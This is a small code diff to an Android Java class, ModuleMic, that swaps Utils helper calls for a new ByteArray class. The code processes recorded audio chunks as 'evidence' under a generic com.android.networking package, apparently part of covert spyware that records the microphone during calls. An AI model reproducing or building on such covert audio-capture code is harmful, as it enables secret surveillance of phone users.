@@ -31,6 +31,7 @@ import com.android.networking.file.AutoFile;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerCall;
 import com.android.networking.manager.ManagerModule;
+import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
@@ -206,12 +207,12 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (chunk != null && chunk.length > 0) {
 
 			// data contiene il chunk senza l'header
-			if (Utils.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
+			if (ByteArray.equals(chunk, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveRecorderEvidence): remove header");
 				}
 				int offset = AMR_HEADER.length;
-				data = Utils.copy(chunk, offset, chunk.length - offset);
+				data = ByteArray.copy(chunk, offset, chunk.length - offset);
 				if (Cfg.MICFILE) {
 					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
 					index++;
@@ -219,9 +220,9 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 				}
 			} else if (unfinished != null && unfinished.length > 0) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveRecorderEvidence): copy bias=" + Utils.byteArrayToHex(unfinished));
+					Check.log(TAG + " (saveRecorderEvidence): copy bias=" + ByteArray.byteArrayToHex(unfinished));
 				}
-				data = Utils.concat(unfinished, unfinished.length, chunk, chunk.length);
+				data = ByteArray.concat(unfinished, unfinished.length, chunk, chunk.length);
 				if (Cfg.MICFILE) {
 					AutoFile file = new AutoFile("/mnt/sdcard/record." + index + ".amr");
 					index++;
@@ -275,12 +276,12 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 							+ unfinishedPos + " chunklen: " + chunklen);
 				}
 				
-				unfinished = Utils.copy(data, unfinishedPos, data.length - unfinishedPos);
+				unfinished = ByteArray.copy(data, unfinishedPos, data.length - unfinishedPos);
 				if (unfinished.length > 0) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (saveRecorderEvidence): removing unfinished from data");
 					}
-					data = Utils.copy(data, 0, unfinishedPos);
+					data = ByteArray.copy(data, 0, unfinishedPos);
 				}
 			}
 
